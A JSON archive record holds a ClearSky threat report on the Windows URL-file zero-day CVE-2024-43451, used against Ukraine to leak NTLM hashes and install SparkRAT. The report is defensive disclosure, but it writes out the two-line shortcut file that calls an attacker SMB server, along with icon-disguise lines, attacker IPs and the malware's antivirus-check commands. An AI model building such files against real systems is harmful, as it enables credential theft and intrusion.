{
    "id": "2dd959de-779a-4f00-b8b4-b464b587afa6",
    "created_at": "2025-02-04T02:05:42.96056Z",
    "updated_at": "2025-03-27T02:16:42.008323Z",
    "deleted_at": null,
    "sha1_hash": "f0b31fd178bfc4073015a4be7bc204042c262d57",
    "title": "",
    "authors": "",
    "file_creation_date": "2024-11-13T19:40:18Z",
    "file_modification_date": "2024-11-13T19:40:18Z",
    "file_size": 1768862,
    "plain_text": "# New Zero-Day Vulnerability Detected: CVE-2024-43451\n\nVer 1\n11/24\n\n\n### Copyright © 2024, ClearSky Cyber Security Ltd (“ClearSky”). All Rights Reserved.\n\n\n-----\n\n## Contents\n### New Zero-Day Vulnerability Detected ITW: CVE-2024-43451\n\nAbstract ................................................................................................................................................................................... 3\n\nAnalysis ................................................................................................................................................................................... 4\n\nURL File Analysis .................................................................................................................................................................... 5\n\nURL File Infrastructure Analysis ........................................................................................................................................... 5\n\nNTLM Hash Exfiltration ......................................................................................................................................................... 6\n\nAnalysis of the URL File Zero-Day Vulnerability ................................................................................................................. 8\n\nInformation Shared by CERT-UA ....................................................................................................................................... 10\n\nPrevious Attacks with Similar Scenarios .......................................................................................................................... 13\n\nIndicators of Compromise: ................................................................................................................................................. 14\n\nCopyright © 2024, ClearSky Cyber Security Ltd (“ClearSky”). All Rights Reserved.\n\n\n-----\n\n### Abstract\n\nOur team has detected a new zero-day vulnerability on several Windows systems. The vulnerability activates URL files,\nleading to malicious activity.\n\nThe malicious files were downloaded from an official Ukrainian government site. The site allows users to download\n\nacademic certificates.\n\nThe vulnerability is exploited by generating a URL file that can be activated using the following non-standard actions:\n\n1. A single right-click (in all versions of Windows).\n\n2. Deleting the file by using the delete button (only in Windows 10/11).\n\n3. Dragging the file to another folder (on Windows 10/11 and in some configurations of Windows 7/8/8.1).\n\nThe following is a diagram of the exploit process:\n\nThe research has been shared with CERT-UA. The Ukrainian CERT revealed that the URL file is propagated as part of a\n\ncampaign by threat actor UAC-0194, suspected as Russian, that targets entities in Ukraine.\n\nThe research has also been shared with the MSRC (Microsoft Security Response Center). Microsoft created a security\n\npatch for Windows systems to fix the vulnerability, giving it the CVE identifier CVE-2024-43451. The security patch was\n\npublished on November 12th, 2024. We would like to thank all our colleagues that took part in the research.\n\nCopyright © 2024, ClearSky Cyber Security Ltd (“ClearSky”). All Rights Reserved.\n\n\n-----\n\n### Analysis\n\nInitial Detection\n\nThe first stage in our research was detecting a suspicious zip file downloaded from a Ukrainian government website\nusing our threat hunting infrastructure.\n\nThe file details are:\n\nFile name: humeniuk_liubov_stanislavivna[.]zip\nFile type: ZIP\nMd5: 948fe6bc00c9d95e22557718d69c92ca\nSha1: e4f894e9a4d33f5202dbך5a10bcd0b54348ea13f8\nSha256: 07b417ffa08f12201eceba3688690bd5c947f657be00e3c883f6ec342ec5c344\n\nThe ZIP file was first submitted to VirusTotal on June 21[st], 2024, by an unregistered user from Ukraine. It was\ndownloaded from hXXps[://]doc[.]osvita-kp[.]gov[.]ua/uploads/53/199804/humeniuk_liubov_stanislavivna[.]zip.\n\ndoc[.]osvita-kp[.]gov[.]ua is an official Ukrainian government site, belonging to the department of education and\nscience of the Kam'yanets'-Podil's'kyi municipality.\n\nThe ZIP archive contains two files and is detected as containing two known vulnerabilities:\n\n  - CVE-2023-320462 – Microsoft Windows MSHTML Platform Privilege Escalation Vulnerability.\n\n  - CVE-2023-360251 – Microsoft Windows SmartScreen Security Feature Bypass Vulnerability .\n\nA PDF file and a URL file contained by the ZIP archive\n\nThe files contained in the ZIP archive are the following:\n\n1 msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36025\n\nCopyright © 2024, ClearSky Cyber Security Ltd (“ClearSky”). All Rights Reserved.\n\n\n-----\n\n  - A PDF file that is not flagged as malicious. The file contains a graduation diploma from Odesa Polytechnic\nNational University awarded to Humeniuk Liubov Stanislavivna (Ukrainian: Гуменюк Любов Станіславівна).\n\n  - A URL (internet shortcut) file:\n\n### URL File Analysis\nThe URL refers to an external server on IP address 92[.]42.96.30 using the SMB protocol (file://), to access two EXE files\n\nwith similar names.\n\n  - Certificate+AF8hFgBf-45052389+AF8-005553[.]exe\n\n  - Certificate_Activate_45052389_005553[.]exe\n\nThe files have different URL addresses on the same server.\n\nWhen examining the URL file, ClearSky’s team exposed a new vulnerability, unrelated to the two vulnerabilities\nmentioned above: Right clicking the file establishes a connection to an external server.\n\nCommunication analysis for the URL file after a single right click. Communication with IP address 92[.]42.96.30 is observed\n\n### URL File Infrastructure Analysis\n\nCopyright © 2024, ClearSky Cyber Security Ltd (“ClearSky”). All Rights Reserved.\n\n\n-----\n\nIP address 92[.]42.96.30 belonged, until August 2024, to Saltu[.]Cloud, a Russian company that provides Virtual Private\nServers (VPS) and allows payment using virtual currency. What raised our suspicion was that a file from a Ukrainian\ngovernment website would communicate with a server of this sort.\n\nThe WHOIS details for IP address 92[.]42.96.30\n\nA webpage from Šaltu Cloud’s website, translated from Russian\nThe site allows payment in digital currency, providing contact through Telegram\n\n### NTLM Hash Exfiltration\n\nCopyright © 2024, ClearSky Cyber Security Ltd (“ClearSky”). All Rights Reserved.\n\n\n-----\n\nIn addition, a sandbox execution raised an alert about an attempt to pass the NTLM (NT Lan Manager) Hash[2] through\nthe SMB[3] (Server Message Block) protocol. After receiving the NTLM Hash, an attacker can carry out a Pass-the-Hash\nattack to identify as the user associated with the captured hash without needing the corresponding password.\n\nAn attempt to pass the NTLM hash through SMB protocol, as observed on AnyRun\n\nDetecting Similar Files\n\nA search for several unique strings that appear in the URL file yielded dozens of similarly structured URL files that\ncontain the vulnerability exposed by ClearSky’s research team. The first of them, submitted to VirusTotal on April 10[th],\n2024, is named images/Certificate_%E2%84%96_45052389_005553[.]zip[.]url:\n\nThe file name structure (beginning with “Certificate” and ending with the digits 005553) was also observed in the initial\n\nURL file analyzed (downloading EXE files with the same filename). The file communicates with an IP address from the\nsame range with which the first detected URL file communicates – 92[.]42.96.10[4] .\n\n2 NTLM is a suite of Microsoft security protocols intended to provide authentication, integrity, and confidentiality to users.\n\n3 SMB is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a\nnetwork.\n\n4 While the first detected URL file communicates with IP address 92[.]42.96.30 .\n\nCopyright © 2024, ClearSky Cyber Security Ltd (“ClearSky”). All Rights Reserved.\n\n\n-----\n\nLeft: The first detected file, downloaded from gov[.]ua. Right: the first file submitted to VT, on April 10[th], 2024\n\nThe other files detected exploiting the new vulnerability followed a similar attack scenario that ended with the\ninstallation of Redline Stealer malware.\n\nThe similarity has two possible explanations:\n\n1. One attacker using different types of malware (the initial file installs SparkRAT malware).\n\n2. Two different threat actors exploiting the same vulnerability.\n\n### Analysis of the URL File Zero-Day Vulnerability \nAn analysis of the initial URL, downloaded from gov[.]ua, revealed the following two lines of code that enable exploiting\nthe vulnerability:\n\n1. [Internet Shortcut].\n2. URL=file://XXX.XXX.XXX.XXX  - XXX can be any IP address, won’t work in http or https must be SMB protocol.\n\nThe stages for creating the file that exploits the vulnerability are as follows:\n\nCreating a text file and adding the above two lines:\n\nSaving the file as a URL file:\n\nA single right click establishes communication with the attacker’s server via SMB protocol:\n\nCopyright © 2024, ClearSky Cyber Security Ltd (“ClearSky”). All Rights Reserved.\n\n\n-----\n\nThe URL file’s icon can be changed to an icon of choice by adding the lines:\n\nIconIndex=X (X being any number between 1-300 or 350)\n\nIconFile=C:\\Windows\\System32\\SHELL32.dll\n\nAs seen in the following screenshot:\n\nThe result looks as follows:\n\nCopyright © 2024, ClearSky Cyber Security Ltd (“ClearSky”). All Rights Reserved.\n\n\n-----\n\nFurther investigation yielded that in Windows 10 and 11 operating systems, the action of dragging the file from one\n\nfolder to another (this does not happen when the file is copied and pasted by Ctrl+C, Ctrl+V) or deleting the file makes\n\nthe file communicate with the embedded server and only then be deleted or moved.\n\nOn Windows 7, 8, and 8.1, the file did not initiate communication when dragged or deleted, unless the target folder was\nopen at the time of dragging (this did not happen on the first attempt but was observed only after 2-3 attempts). That\nis, the newly detected vulnerability is more exploitable on Windows 10/11 operating systems.\n\n### Information Shared by CERT-UA\n\nCERT-UA shared technical information with ClearSky regarding the email sent to the target to launch the attack chain.\n\nThe lure email message is sent from a Ukrainian government server. The message body includes a demand to renew\nthe academic certificate, as the current certificate is allegedly about to expire.\n\nWhen clicking the URL file (even on a single right click), communication is established with the attacker’s server,\neventually leading to downloading a file named Certificate_Activate_45052389_005553[.]exe. The file is signed by an\nunverified signature of Jiangxia Information Technology (Huizhou) Co.\n\nThe unverified signature of Jiangxia Information Technology (Huizhou) Co.\n\nCopyright © 2024, ClearSky Cyber Security Ltd (“ClearSky”). All Rights Reserved.\n\n\n-----\n\nActions carried out by executing file certificate_activate_45052389_00553[.]exe\n\nWhen executing the file, an error message appears stating the certificate has been activated, and the information has\n\nbeen sent to the governmental certification system.\n\nThe attackers use an error message to claim that the certificate has been successfully activated after executing the file\n\nThen a file named Learn[.]cmd is dropped and executed. The CMD file includes commands encoded by adding garbage\n\nstrings and using several variables that, when put together, create the commands:\n\nCopyright © 2024, ClearSky Cyber Security Ltd (“ClearSky”). All Rights Reserved.\n\n\n-----\n\nThe commands carried out by file Learn[.]cmd:\n\n  - Tasklist[.]exe – listing all tasks running on the system.\n\n  - findstr /I avastui.exe avgui.exe nswscsvc.exe sophoshealth.exe – checking for installed AV engines.\n\n  - findstr /I \"wrsa.exe opssvc.exe\" – checking for additional security components.\n\n  - findstr /V \"RealizedLivingFiredVotes\" Cornwall  – finding the file “Cornwall”, generated by\nCertificate_Activate_45052389_005553[.]exe, that contains an executable header and the string\nRealizedLivingFiredVotes. The executable is generated ignoring the string.\nThe “Cornwall” file:\n\nFinal Payload\n\nFurther actions in the attack scenario:\n\nCopyright © 2024, ClearSky Cyber Security Ltd (“ClearSky”). All Rights Reserved.\n\n\n-----\n\n  - Using programming language Autolt to execute SparkRAT malware.\n\n  - Creating scheduled task Wave360 Sync Technologies Co\\SyncWave360[.]js to establish persistence.\n\n  - Creating an additional layer of persistence by copying file SyncWave360[.]js to the startup folder.\n\n  - SparkRAT communicates with server 77[.]83.172.47 via port 8000.\n\nSparkRAT is an open-source malware available on GitHub[5]. Following are the malware’s features from the GitHub\n\npage:\n\n### Previous Attacks with Similar Scenarios\n\nThis attack vector is not unique and has been observed in past attacks:\n\n   - An attack campaign by cognitive actor Handala, that included impersonating CrowdStrike.\n\n   - A campaign propagating a generic stealer, not attributed to a specific actor (Lumma Stealer).\n\nClearSky assesses this is a common process (possibly facilitated by a public tool), used by attackers to evade detection\nby AV engines.\n\n5 github.com/XZB-1248/Spark\n\nCopyright © 2024, ClearSky Cyber Security Ltd (“ClearSky”). All Rights Reserved.\n\n\n-----\n\n### Indicators of Compromise:\n\nFiles (SHA-256):\naac3f49b8c875ca842f96dd6dde194102944907a956fad1ff1cff14c64aaf2e0\n07b417ffa08f12201eceba3688690bd5c947f657be00e3c883f6ec342ec5c344\n0efe4a603dd59b377798ae2889fe47a851f79e36d1a925d327a93416204d1767\n6c6ba73e4c80853219121f922e60564720d414bf42d8bc542dac800560d1eb36\ndf74298b2ecb33558bd34b7d59bcade5901eb5db1b61ce9aa1ae27e597f4f58d\n928cdef8fb7c2ba9aa96ab726d74aa7a18b032102d9ec4ed00e7559f98c1bdf9\ne4a6368556c15d316960bd605827c00e336ef6e56c369090803a46ff69dfd4ac\n715a69b898bd0a056098d24505046391e29381f671952d5e860c0cb41779a49f\nc423ea5a16e33d3b988358ad649bb43a3265cad8e118ed91863d8b9dc3e8f8f9\ncaba3a8900302df5b83d260ed1f4da19b68f8c2d1b92c6dfc91b2ca01f14a1ef\n8cf24fe1384ca8ea763081b78fd14995704bbd73a871ebe1c362053767aeec20\n5499a4bf696fdbbe41cdc2bc9efae2df93306a135643a3651701c5ca57570eb7\nad10aaac2661b2dd17ef586a2bf8f3dca7a82abda2580dbd3aca2d52cc5460ae\n6de2602f486985bfadae3b4ac06af041f22fd41559954a6ecd262f7c3a8aa681\nd6d77204740bd3bdd2fd5e918a7ba9134c1d7d10eb3d6972749009dd50df6cc8\n34073f2055002791ed3cad21be0e94b33ff4345eab8a5e7801dfdafa7cc2fb99\ne2ad6fa6dbe71e9ab10dcf3bad4b82538dabe34a3011fdaa2eeb302b67ea776d\n6ec7f86cc19df1fef8063242ef6861355cc7ed25a669de842e1cda7332eca343\n994fa6d6b44379a8271e0936cf2a2e898de4f720ab8c1fec98be674f20df883d\n\n### IP addresses: 92.42.96[.]10 92.42.96[.]30 89.23.102[.]251 89.23.101[.]101 77.83.172[.]47\n\nCopyright © 2024, ClearSky Cyber Security Ltd (“ClearSky”). All Rights Reserved.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://www.clearskysec.com/wp-content/uploads/2024/11/Zero-day-cve-2024-4351-report.pdf"
    ],
    "report_names": [
        "Zero-day-cve-2024-4351-report.pdf"
    ],
    "threat_actors": [
        {
            "id": "4134675e-5b72-4b50-8d70-1a8f18aafbb4",
            "created_at": "2024-10-04T02:00:04.766263Z",
            "updated_at": "2025-03-27T02:00:03.429899Z",
            "deleted_at": null,
            "main_name": "Handala",
            "aliases": [],
            "source_name": "MISPGALAXY:Handala",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "dbcd2cc1-1adb-43cf-b175-a3ef4ee0d15e",
            "created_at": "2024-11-16T02:00:03.808384Z",
            "updated_at": "2025-03-27T02:00:03.458972Z",
            "deleted_at": null,
            "main_name": "UAC-0194",
            "aliases": [],
            "source_name": "MISPGALAXY:UAC-0194",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1738634742,
    "ts_updated_at": 1743041802,
    "ts_creation_date": 1731526818,
    "ts_modification_date": 1731526818,
    "files": {
        "pdf": "https://archive.orkl.eu/f0b31fd178bfc4073015a4be7bc204042c262d57.pdf",
        "text": "https://archive.orkl.eu/f0b31fd178bfc4073015a4be7bc204042c262d57.txt",
        "img": "https://archive.orkl.eu/f0b31fd178bfc4073015a4be7bc204042c262d57.jpg"
    }
}